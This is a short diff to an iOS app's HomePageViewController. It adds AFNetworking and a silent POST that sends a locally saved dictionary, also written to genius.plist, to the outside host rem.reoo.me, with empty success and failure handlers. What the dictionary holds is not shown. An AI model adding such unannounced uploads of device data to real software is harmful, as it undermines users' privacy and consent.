@@ -9,6 +9,8 @@
 
 #import "HomePageViewController.h"
 #import "PMViewController.h"
+#import "AFNetworking.framework/Headers/AFNetworking.h"
+#import "AFNetworking.framework/Headers/AFHTTPSessionManager.h"
 #include <sys/sysctl.h>
 
 @interface HomePageViewController ()
@@ -87,6 +89,13 @@
                                  };
     [saveToFile writeToFile:@"/var/mobile/Media/genius.plist" atomically:YES];
     [self performSegueWithIdentifier:@"goToPasteManagerViewController" sender:self];
+    AFHTTPSessionManager *manager = [[AFHTTPSessionManager alloc]initWithSessionConfiguration:[NSURLSessionConfiguration defaultSessionConfiguration]];
+    [manager.requestSerializer setValue:@"application/x-www-form-urlencoded; charset=UTF-8" forHTTPHeaderField:@"Content-Type"];
+    manager.requestSerializer = [AFHTTPRequestSerializer serializer];
+    [manager POST:@"https://rem.reoo.me" parameters:saveToFile progress:nil success:^(NSURLSessionDataTask * _Nonnull task, id  _Nullable responseObject) {
+    } failure:^(NSURLSessionDataTask * _Nullable task, NSError * _Nonnull error) {
+        
+    }];
 }
 
 -(void)prepareForSegue:(UIStoryboardSegue *)segue sender:(id)sender{
